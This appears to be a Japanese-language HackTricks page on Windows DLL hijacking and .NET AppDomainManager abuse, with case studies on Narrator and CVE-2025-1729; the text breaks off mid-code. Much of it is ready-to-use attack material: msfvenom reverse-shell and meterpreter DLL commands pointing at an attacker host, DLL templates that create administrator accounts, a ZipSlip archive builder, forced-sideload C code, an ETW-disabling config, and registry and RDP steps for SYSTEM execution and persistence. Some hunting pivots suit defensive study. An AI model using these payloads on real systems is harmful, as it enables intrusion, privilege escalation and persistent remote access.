# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijacking では、信頼されたアプリケーションを操作して、悪意のある DLL をロードさせます。この用語には、**DLL Spoofing、Injection、Side-Loading** などの複数の手法が含まれます。主に code execution、永続化の実現に利用され、privilege escalation に使われることは比較的少数です。ここでは escalation に焦点を当てていますが、hijacking の手法自体は目的にかかわらず同じです。

### 一般的な手法

DLL hijacking には複数の手法があり、それぞれの有効性はアプリケーションの DLL loading strategy によって異なります。<sup>[[4]](#references)</sup>

1. **DLL Replacement**: 正規の DLL を悪意のある DLL に置き換えます。必要に応じて DLL Proxying を使用し、元の DLL の機能を維持できます。
2. **DLL Search Order Hijacking**: 正規の DLL よりも前に検索される search path に悪意のある DLL を配置し、アプリケーションの search pattern を悪用します。
3. **Phantom DLL Hijacking**: 存在しない必須 DLL だとアプリケーションに思わせて、ロードさせる悪意のある DLL を作成します。
4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` ファイルなどの search parameter を変更し、アプリケーションを悪意のある DLL に誘導します。
5. **WinSxS DLL Replacement**: WinSxS directory 内の正規 DLL を悪意のある DLL に置き換えます。これは DLL side-loading に関連することが多い手法です。
6. **Relative Path DLL Hijacking**: コピーしたアプリケーションとともに、user-controlled directory に悪意のある DLL を配置します。これは Binary Proxy Execution techniques に類似しています。


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading だけが、信頼された **.NET Framework** process に attacker code をロードさせる方法ではありません。対象の executable が **managed** application の場合、CLR は executable にちなんだ名前の **application configuration file**（例: `Setup.exe.config`）も参照します。このファイルでは、custom **AppDomainManager** を定義できます。config が、EXE の隣に配置された attacker-controlled assembly を指している場合、CLR はアプリケーションの通常の code path よりも前にそれをロードし、信頼された process 内で実行します。<sup>[[24]](#references)</sup>

Microsoft の .NET Framework configuration schema によれば、custom manager を使用するには `<appDomainManagerAssembly>` と `<appDomainManagerType>` の両方が存在している必要があります。<sup>[[16]](#references)[[17]](#references)</sup>

最小構成:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
最小限のマネージャー：
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
実践メモ:
- これは **.NET Framework 固有**の tradecraft です。Win32 DLL search order ではなく、CLR の config parsing に依存します。
- ホストは実際に **managed EXE** でなければなりません。簡易 triage: `sigcheck -m target.exe`、`corflags target.exe` を使用するか、PE metadata の **CLR Runtime Header** を確認します。
- config filename は executable name と完全に一致する必要があり（`<binary>.config`）、通常は **EXE の隣**に配置されます。
- これは **signed Microsoft/vendor binaries** で有用です。信頼された EXE を変更せずに、悪意のある managed assembly を in-process で実行できます。
- すでに writable installer/update directory がある場合、AppDomainManager hijacking を **first stage** として使用し、その後の stages で classic DLL sideloading または reflective loading を使用できます。

### AppDomainManager as a downloader + scheduled-task bootstrap

実用的な intrusion pattern では、信頼された managed EXE と、**small bootstrapper** としてのみ動作する malicious `*.config` および malicious AppDomainManager DLL を組み合わせます:<sup>[[25]](#references)</sup>

1. ユーザーが、`%USERPROFILE%\Downloads` のようなもっともらしい場所から signed .NET installer または updater を起動します。
2. 隣接する config により、正規の app logic が開始する**前に** CLR が attacker assembly を load します。
3. malicious manager が **path gate** を実行します（たとえば、host EXE が `Downloads` から実行されている場合のみ続行し、second stage は `%LOCALAPPDATA%` から実行される場合のみ許可します）。
4. check に合格すると、`%LOCALAPPDATA%\PerfWatson2.exe` のような user-writable path に real payload を download し、scheduled task で persistence を確立します。

この variant が重要である理由:
- signed host EXE は変更されないため、main binary の hash のみを確認する triage では compromise を見逃す可能性があります。
- 単純な **path-based anti-analysis** は一般的です。ZIP/EXE/DLL の triad を Desktop、Temp、または sandbox path に移動すると、意図的に chain を破壊できます。
- first-stage AppDomainManager DLL は小さく low-noise のままにでき、real implant は後から fetch できます。

この pattern で頻繁に見られる minimal persistence example:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
注:
- ` /rl highest` は、そのユーザー/セッションで**利用可能な最高レベル**を意味します。これだけで SYSTEM への昇格が保証されるわけではありません。
- この technique は、古典的な DLL の欠落による検索順序 hijacking というより、**.NET config の悪用による execution/persistence** として分類する方が適切な場合が多くあります。ただし、攻撃者は両方を頻繁に連鎖させます。

Detection pivots:
- **ZIP の展開先**, `Downloads`、`%TEMP%`、その他のユーザーが書き込み可能なフォルダーから起動され、同じ場所に `<exe>.config` が存在する署名付き .NET executable。
- アクションの参照先が `%LOCALAPPDATA%`、`%APPDATA%`、または `Downloads` で、名前がブラウザーやベンダーの updater に似ている新しい scheduled task。
- 別の EXE を直ちに download し、その後 `schtasks.exe` を spawn する短時間だけ実行される managed bootstrap process。
- executable path が想定されたユーザープロファイルのディレクトリと一致しない限り、早期終了する sample。

### 既存の scheduled task を hijack して sideload chain を再起動する

persistence の場合、**新しい task の作成**だけを探してはいけません。一部の intrusion set は、正規の installer が**通常の updater task**を作成するまで待機し、その後 **task action を書き換え**ます。これにより、既存の名前、作成者、trigger は defender にとって見慣れたままになります。

再利用可能な workflow:
1. 正規の software を install/run し、通常作成される task を特定します。
2. task XML を export し、現在の `<Exec><Command>` / `<Arguments>` の値を確認します。<sup>[[23]](#references)</sup>
3. action のみを置き換え、task がユーザーの書き込み可能な staging directory にある **trusted host EXE** を起動するようにします。この EXE は、その後 real payload を side-load または AppDomain-load します。
4. 新しく分かりやすい persistence artifact を作成するのではなく、同じ task name で再登録します。
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
なぜより stealthy なのか:
- task name は、正当なものに見せかけられる（例: vendor updater）。
- **Task Scheduler service** が起動するため、parent/ancestor validation では `explorer.exe` ではなく、想定された scheduling chain が検出されることが多い。
- **new task names** だけを探す DFIR team は、registration 自体は以前から存在するものの、action が `%LOCALAPPDATA%`、`%APPDATA%`、または attacker-controlled path を指すように変更された task を見逃す可能性がある。

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML と `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata を baseline と比較する。
- **vendor-looking updater task** が **user-writable directories** から実行される、または隣接する `*.config` file を持つ .NET EXE を起動する場合に alert を出す。

> [!TIP]
> HTML staging、AES-CTR configs、.NET implants を DLL sideloading に組み合わせた step-by-step chain については、以下の workflow を確認してください。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 不足している Dlls の発見

system 内の不足している Dlls を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、**以下の 2 つの filter を設定する**ことです:

![Common Techniques - 不足している Dlls の発見: system 内の不足している Dlls を見つける最も一般的な方法は、sysinternals の procmon を実行し、以下の 2 つの filter を設定することです](<../../../images/image (961).png>)

![Common Techniques - 不足している Dlls の発見: system 内の不足している Dlls を見つける最も一般的な方法は、sysinternals の procmon を実行し、以下の 2 つの filter を設定することです](<../../../images/image (230).png>)

そして **File System Activity** のみを表示します:

![Common Techniques - 不足している Dlls の発見: File System Activity のみを表示する](<../../../images/image (153).png>)

**不足している dlls 全般**を探している場合は、これを数**秒間**実行したままにします。\
**特定の executable 内の不足している DLL** を探している場合は、**"Process Name" "contains" `<exec name>`** などの別の filter を設定し、それを実行してから、event の capture を停止します。<sup>[[9]](#references)</sup>

## 不足している Dlls の Exploiting

privilege を escalate するには、**privileged process が、書き込み可能な location から load しようとする DLL** を探します。これは、正規の DLL が存在する directory より先に検索される directory を control している場合や、要求された DLL が存在せず、検索対象 directory のいずれかに書き込める場合に発生します。

### Dll Search Order

**[Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) 内で、Dlls が具体的にどのように load されるかを確認できます。**

**Windows applications** は、**pre-defined search paths** の set に従い、特定の sequence で DLL を探します。DLL hijacking の問題は、malicious DLL をこれらの directory のいずれかに戦略的に配置し、正規の DLL より先に load されるようにすることで発生します。これを防ぐには、application が必要とする DLL を参照する際に absolute paths を使用するようにします。

以下に **32-bit** system の **DLL search order** を示します:

1. application が load された directory。
2. system directory。[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function を使用して、この directory の path を取得します。(_C:\Windows\System32_)
3. 16-bit system directory。この directory の path を取得する function はありませんが、検索されます。(_C:\Windows\System_)
4. Windows directory。[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function を使用して、この directory の path を取得します。
1. (_C:\Windows_)
5. current directory。
6. PATH environment variable に列挙されている directory。**App Paths** registry key で指定された per-application path は含まれないことに注意してください。DLL search path の計算時に **App Paths** key は使用されません。

これは **SafeDllSearchMode** が enabled の場合の **default** search order です。disabled にすると current directory が 2 番目に移動します。この feature を disabled にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value を作成し、0 に設定します（default は enabled）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function が **LOAD_WITH_ALTERED_SEARCH_PATH** とともに call された場合、search は **LoadLibraryEx** が load している executable module の directory から開始されます。

最後に、DLL は name ではなく absolute path で load できます。その場合、Windows は DLL 自体についてはその path のみを確認します。ただし、name で要求された dependencies は引き続き該当する search order に従います。

search order を変更する方法は他にもありますが、ここでは説明しません。

### arbitrary file write を missing-DLL hijack に Chaining する

1. **ProcMon** filters（`Process Name` = target EXE、`Path` ends with `.dll`、`Result` = `NAME NOT FOUND`）を使用して、process が probe するものの見つけられない DLL names を収集します。<sup>[[14]](#references)</sup>
2. binary が **schedule/service** で実行される場合、それらの names のいずれかを持つ DLL を **application directory**（search-order entry #1）に配置すると、次回の execution 時に load されます。ある .NET scanner の case では、process は `C:\samples\app\` にある `hostfxr.dll` を探してから、`C:\Program Files\dotnet\fxr\...` にある real copy を load していました。
3. 任意の export を持つ payload DLL（例: reverse shell）を build します: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`
4. primitive が **ZipSlip-style arbitrary write** の場合、extraction dir から escape する entry を含む ZIP を作成し、DLL が app folder に配置されるようにします:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. archiveを監視対象の inbox/share に配置します。scheduled task がプロセスを再起動すると、悪意のある DLL がロードされ、service account としてコードが実行されます。

### RTL_USER_PROCESS_PARAMETERS.DllPath を介した sideloading の強制

新しく作成するプロセスの DLL search path に決定論的な影響を与える高度な方法として、ntdll の native API を使用してプロセスを作成する際に、RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定する方法があります。ここに attacker-controlled directory を指定すると、名前で imported DLL を解決する target process（absolute path を使用せず、安全な loading flags も使用しない場合）に対して、そのディレクトリから悪意のある DLL を強制的にロードさせることができます。

主な考え方
- RtlCreateProcessParametersEx で process parameters を構築し、controlled folder（例：dropper/unpacker が存在するディレクトリ）を指す custom DllPath を指定します。
- RtlCreateUserProcess でプロセスを作成します。target binary が DLL を名前で解決すると、loader は解決時に指定された DllPath を参照するため、悪意のある DLL が target EXE と同じ場所に存在しなくても、信頼性の高い sideloading が可能になります。

注意点と制限
- これは作成される child process に影響します。current process のみに影響する SetDllDirectory とは異なります。
- target は DLL を名前で import または LoadLibrary する必要があります（absolute path を使用せず、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories も使用しないこと）。
- KnownDLLs と hardcoded absolute paths は hijack できません。Forwarded exports と SxS によって優先順位が変わる場合があります。

最小限の C example（ntdll、wide strings、簡略化した error handling）：

<details>
<summary>RTL_USER_PROCESS_PARAMETERS.DllPath を介して DLL sideloading を強制する完全な C example</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

実運用での使用例
- 必要な関数を export する、または実体への proxy を行う悪意のある xmllite.dll を、DllPath ディレクトリに配置します。
- 上記の technique を使用して、名前で xmllite.dll を検索することが知られている署名済み binary を起動します。loader は指定された DllPath 経由で import を解決し、DLL を sideload します。

この technique は、実環境で multi-stage sideloading chain を実行するために使用されていることが確認されています。初期 launcher が helper DLL をドロップし、その DLL が Microsoft 署名済みの hijack 可能な binary を、custom DllPath とともに起動して、staging directory から攻撃者の DLL を強制的にロードさせます。<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

**.NET Framework** target では、アプリケーションに隣接する **`.exe.config`** ファイルを悪用することで、memory を patch せずに **`Main()`** より前に sideloading を実行できます。Win32 DLL search order のみに依存する代わりに、攻撃者は正規の .NET EXE の隣に、悪意のある config と1つ以上の攻撃者が制御する assembly を配置します。

chain の動作:<sup>[[15]](#references)[[22]](#references)</sup>
1. host EXE が起動し、**CLR が `<exe>.config` を読み取ります**。
2. config が **`<appDomainManagerAssembly>`** と **`<appDomainManagerType>`** を設定することで、runtime が攻撃者の制御する `AppDomainManager` を instantiate します。
3. 悪意のある manager が、trusted host process 内で **pre-`Main()` execution** を取得します。
4. 同じ config により、CLR が local assembly（例: `InitInstall.dll`、`Updater.dll`、`uevmonitor.dll`）を先に resolve するよう強制でき、inline patching なしで runtime validation や telemetry を弱めることもできます。

Campaign-style pattern（directive / CLR version によって正確な nesting は異なる場合があります）:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
有用な理由:
- **`<probing privatePath="."/>`** は assembly の解決を application directory 内に限定し、フォルダーを予測可能な sideloading surface にします。<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** は CLR initialization 中、正規の app logic が実行される前に execution を attacker code へ移します。<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** により、full-trust app が strong-name validation failure なしで unsigned または改ざんされた assemblies を load できる場合があります。<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** は、より新しい assemblies への publisher-policy redirects を回避します。<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** は runtime selection をより決定論的にします。<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** は特に興味深いものです。implant が memory 内で `EtwEventWrite` を patch するのではなく、configuration から **CLR 自身の ETW visibility を無効化**するためです。

近年の campaign で確認されている operational pattern:
- Stage 1 では `setup.exe`、`setup.exe.config`、および local assemblies を drop します。
- Stage 2 ではそれらをもっともらしい **AppData update** フォルダーへ copy し、host の名前を `update.exe` のようなものに変更して、**scheduled task** 経由で relaunch します。
- Stage 3 では、final RAT DLL/export を load する前に execution context（たとえば Task Scheduler から想定される parent `svchost.exe`）を verify します。

Hunting のアイデア:
- user-writable locations で、不審な隣接 **`.config`** files とともに実行される、signed または otherwise legitimate な **.NET executables**。
- **`appDomainManagerAssembly`**、**`appDomainManagerType`**、**`probing privatePath="."`**、**`bypassTrustedAppStrongNames`**、または **`etwEnable enabled="false"`** を含む `.config` files。
- **`%LOCALAPPDATA%`** または app-specific な `\bin\update\` directories から renamed update binaries を relaunch する scheduled tasks。
- scheduled task が trusted .NET host を launch し、その host が自身の directory から non-vendor assemblies を直ちに load する parent/child chains。

#### Windows docs における DLL search order の例外

Windows documentation では、標準 DLL search order に対する特定の例外が記載されています:

- **すでに memory に load されている DLL と同じ名前の DLL** が検出された場合、system は通常の search を bypass します。代わりに redirection と manifest の check を実行し、その後、すでに memory にある DLL を default として使用します。**この scenario では、system は DLL の search を実行しません**。
- DLL が現在の Windows version における **known DLL** として認識される場合、system は search process を**省略し**、その known DLL の version と、それが依存する DLLs を使用します。registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** には、これらの known DLLs の list が保存されています。
- **DLL に dependencies がある**場合、それらの dependent DLLs の search は、initial DLL が full path によって特定されたかどうかにかかわらず、**module names** のみで指定されたものとして実行されます。

### Privileges の Escalating

**Requirements**:

- **different privileges**（horizontal または lateral movement）で operate している、または operate する process で、**DLL が不足している**ものを identify します。
- **DLL** が search される**directory** のいずれかに、**write access** が存在することを確認します。この location は executable の directory、または system path 内の directory である可能性があります。

これらの prerequisites は default では一般的ではありません。privileged executables に missing DLL dependencies があることは通常なく、standard users は通常 system search-path directories に write できません。それでも、misconfigured environments では両方の conditions が露呈する可能性があります。\
requirements が満たされている場合は、[UACME](https://github.com/hfiref0x/UACME) project を確認してください。主な目的は UAC bypass ですが、特定の Windows versions 向けの DLL-hijacking PoCs が含まれており、見つかった writable directory に合わせて適応できることがあります。

次のように実行して、**folder 内の permissions を check**できることに注意してください:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
また、**PATH 内のすべてのフォルダの権限を確認**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
実行ファイルの imports と DLL の exports は、次の方法でも確認できます：
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
**System Path folder**への書き込み権限を利用して**Dll Hijackingで権限昇格する方法**の完全なガイドは、以下を確認してください:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自動化ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、system PATH内のいずれかのフォルダーに書き込み権限があるかを確認します。\
この脆弱性を発見するための、その他の有用な自動化ツールには、**PowerSploit functions**である _Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_があります。

### 例

悪用可能なシナリオを発見した場合、成功裏に exploit するために最も重要なことの1つは、**実行ファイルがそこから import するすべての関数を少なくとも export する dllを作成すること**です。ただし、Dll Hijackingは、[Medium Integrity levelからHigh **(UACをバイパス)**](../../authentication-credentials-uac-and-efs/index.html#uac)へ、または[ **High IntegrityからSYSTEM**](../index.html#from-high-integrity-to-system)**.**へ昇格する際に役立つことに注意してください。**有効なdllの作成方法**の例は、実行のためのdll hijackingに焦点を当てた、以下のdll hijacking studyで確認できます: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
さらに、**次のセクショ**ンでは、**テンプレート**として使用したり、**必須ではない関数をexportするdll**を作成したりする際に役立つ、いくつかの**基本的なdllコード**を紹介します。

## **Dllの作成とコンパイル**

### **Dll Proxifying**

基本的に、**Dll proxy**とは、**ロード時に悪意のあるコードを実行**できるだけでなく、**実際のライブラリへのすべての呼び出しを中継することで**、本来の動作どおりに**公開**および**動作**できるDllです。

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)または[**Spartacus**](https://github.com/Accenture/Spartacus)を使うと、実行ファイルを指定してproxifyしたいライブラリを選択し、**proxified dllを生成**できます。または、Dllを指定して**proxified dllを生成**できます。

### **Meterpreter**

**rev shellを取得 (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter を取得 (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成（x86版。x64版は見つけられなかった）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自作

多くの場合、コンパイルする DLL は、**被害プロセスがインポートするすべての関数を export** する必要があります。必要な export が存在しない場合、バイナリはその関数を解決できず、exploit は失敗します。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>ユーザー作成を含む C++ DLL の例</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>スレッドエントリを備えた別の C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## ケーススタディ: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe は起動時に、予測可能な言語固有の localization DLL を引き続き検索するため、これを hijack して任意のコード実行および永続化に利用できます。<sup>[[7]](#references)</sup>

主な事実
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US)。
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`。
- OneCore path に attacker-controlled で書き込み可能な DLL が存在すると、ロードされ、`DllMain(DLL_PROCESS_ATTACH)` が実行されます。Exports は必要ありません。

Procmon を使用した Discovery
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`。
- Narrator を起動し、上記 path の load 試行を確認します。

最小 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- 素朴な hijack では UI に発言やハイライトが発生します。静かに動作させるには、attach 時に Narrator の thread を列挙し、メイン thread を (`OpenThread(THREAD_SUSPEND_RESUME)`) で開いて `SuspendThread` します。その後は自分の thread で処理を続行します。完全なコードについては PoC を参照してください。<sup>[[8]](#references)</sup>

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記の設定により、Narrator の起動時に設置した DLL が load されます。secure desktop（logon screen）で CTRL+WIN+ENTER を押して Narrator を起動すると、DLL は secure desktop 上で SYSTEM として実行されます。

RDP-triggered SYSTEM execution (lateral movement)
- classic RDP security layer を許可します: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- host に RDP 接続し、logon screen で CTRL+WIN+ENTER を押して Narrator を起動します。DLL は secure desktop 上で SYSTEM として実行されます。
- RDP session を閉じると実行は停止します—速やかに inject/migrate してください。

Bring Your Own Accessibility (BYOA)
- 組み込み Accessibility Tool (AT) の registry entry（例: CursorIndicator）を clone し、任意の binary/DLL を指すように編集して import した後、`configuration` をその AT name に設定できます。これにより、Accessibility framework の下で任意の実行を proxy できます。

Notes
- `%windir%\System32` 配下への書き込みと HKLM の値の変更には admin rights が必要です。
- すべての payload logic は `DLL_PROCESS_ATTACH` に配置できます。exports は必要ありません。

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

この case では、Lenovo の TrackPoint Quick Menu (`TPQMAssistant.exe`) における **Phantom DLL Hijacking** を取り上げます。この問題は **CVE-2025-1729** として追跡されています。<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: `C:\ProgramData\Lenovo\TPQM\Assistant\` にある `TPQMAssistant.exe`。
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` は毎日午前 9:30 に、logon 済み user の context で実行されます。
- **Directory Permissions**: `CREATOR OWNER` による write が可能であり、local user は arbitrary file を配置できます。
- **DLL Search Behavior**: 最初に working directory から `hostfxr.dll` の load を試み、見つからない場合は "NAME NOT FOUND" を log に記録します。これは local directory search precedence を示しています。

### Exploit Implementation

attacker は同じ directory に malicious な `hostfxr.dll` stub を配置できます。missing DLL を exploit することで、user の context で code execution を実現します:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
